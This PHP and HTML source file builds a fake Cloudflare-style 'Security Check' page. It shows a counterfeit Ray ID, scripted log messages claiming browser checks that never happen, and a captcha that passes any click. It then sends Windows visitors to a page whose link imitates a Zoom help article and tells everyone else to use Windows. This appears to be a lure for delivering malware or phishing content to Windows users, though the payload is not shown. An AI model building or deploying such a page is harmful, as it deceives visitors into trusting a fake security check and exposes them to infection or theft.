<?php
session_start();

/* ================= CONFIG ================= */
$RATE_LIMIT = 10;          // attempts
$RATE_WINDOW = 600;        // seconds
$DAILY_LIMIT = 86400;      // 24h

/* ================= HELPERS ================= */
function ip() {
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}
function now() {
    return time();
}

/* ================= RATE LIMIT ================= */
$ip = ip();
$_SESSION['rate'][$ip] ??= [];

$_SESSION['rate'][$ip] = array_filter(
    $_SESSION['rate'][$ip],
    fn($t) => $t > now() - $RATE_WINDOW
);

if (count($_SESSION['rate'][$ip]) >= $RATE_LIMIT) {
    usleep(rand(800000,1500000)); // soft throttle
}

/* ================= DAILY IP GATE ================= */
$ipDayKey = hash('sha256', $ip . date('Y-m-d'));
$passedToday = $_SESSION['passed_today'][$ipDayKey] ?? false;

/* ================= VERIFY ENDPOINT ================= */
if (isset($_GET['verify']) && $_GET['verify'] === '1') {
    $_SESSION['rate'][$ip][] = now();
    usleep(rand(300000,1200000)); // server-side delay

    $_SESSION['verified'] = true;
    $_SESSION['passed_today'][$ipDayKey] = true;
    exit;
}

/* ================= DEVICE ================= */
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$isWindows = str_contains($ua,'windows');

/* ================= RAY ID ================= */
$ray = substr(bin2hex(random_bytes(8)),0,16);
$colo = ['LHR','AMS','FRA','CDG','JFK','SFO'][array_rand([0,1,2,3,4,5])];

$needsCaptcha = !$passedToday && empty($_SESSION['verified']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Security Check</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
    background:#0f1115;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
    height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
}
.cf,.app{
    width:440px;
    background:#fff;
    border-radius:10px;
    padding:24px;
    box-shadow:0 40px 90px rgba(0,0,0,.45);
}
.log{
    font-family:monospace;
    font-size:12px;
    background:#f9fafb;
    padding:10px;
    border-radius:6px;
    height:120px;
    overflow:hidden;
}
.check{
    display:flex;gap:14px;
    align-items:center;
    border:1px solid #e5e7eb;
    padding:16px;
    border-radius:8px;
    cursor:pointer;
}
.box{
    width:26px;height:26px;
    border:2px solid #9ca3af;
    border-radius:4px;
    display:flex;
    align-items:center;
    justify-content:center;
}
.spin{
    width:16px;height:16px;
    border:3px solid #d1d5db;
    border-top:3px solid #2563eb;
    border-radius:50%;
    animation:spin 1s linear infinite;
    display:none;
}
@keyframes spin{to{transform:rotate(360deg)}}
.footer{
    margin-top:14px;
    font-size:11px;
    color:#6b7280;
    text-align:center;
}
.app{
    display:none;
    background:#1c1c1e;
    color:#fff;
}
.error{display:none;color:#e02828}
</style>
</head>

<body>

<?php if($needsCaptcha): ?>
<!-- ================= CAPTCHA ================= -->
<div class="cf" id="captcha">
    <strong>Security Check</strong>
    <p style="font-size:13px;color:#6b7280">
        Verifying your browser before accessing…
    </p>

    <div class="check" id="check">
        <div class="box" id="box"></div>
        <div>
            <strong>Verify you are human</strong>
            <div class="spin" id="spin"></div>
        </div>
    </div>

    <div class="log" id="log"></div>

    <div class="footer">
        Ray ID: <?=$ray?> • <?=$colo?>
    </div>
</div>
<?php endif; ?>

<!-- ================= APP ================= -->
<div class="app" id="app">
    <h3>Checking device compatibility…</h3>
    <div class="error" id="error">
        Device not supported. Please use Windows.
    </div>
</div>

<script>
const logs = [
 "▶ Initializing security challenge",
 "✔ JavaScript execution verified",
 "✔ Cookie support enabled",
 "✔ Browser entropy collected",
 "✔ Timing analysis passed",
 "✔ Headless browser not detected",
 "✔ Verification successful"
];

function startApp(){
 document.getElementById("app").style.display="block";
 setTimeout(()=>{
   <?php if($isWindows): ?>
     window.location.href="index.html?zoom.com/hc/en/article?id=zm_kb&sysparm_article=KB0060732-zm_kb&sysparm_article=KB0060732-zm_kb&sysparm_article=KB0060732";
   <?php else: ?>
     document.getElementById("error").style.display="block";
   <?php endif; ?>
 },2000);
}

<?php if($needsCaptcha): ?>
let i=0,logBox=document.getElementById("log");
document.getElementById("check").onclick=()=>{
 document.getElementById("spin").style.display="inline-block";
 let t=setInterval(()=>{
   if(i<logs.length){
     logBox.innerHTML+=logs[i++]+"<br>";
     logBox.scrollTop=logBox.scrollHeight;
   } else clearInterval(t);
 },300+Math.random()*300);

 setTimeout(()=>{
   fetch("?verify=1").then(()=>{
     localStorage.setItem("cf_verified","1");
     document.getElementById("captcha").remove();
     startApp();
   });
 },1500+Math.random()*2000);
};
<?php else: ?>
if(localStorage.getItem("cf_verified")==="1"){
 startApp();
}
<?php endif; ?>
</script>

</body>
</html>
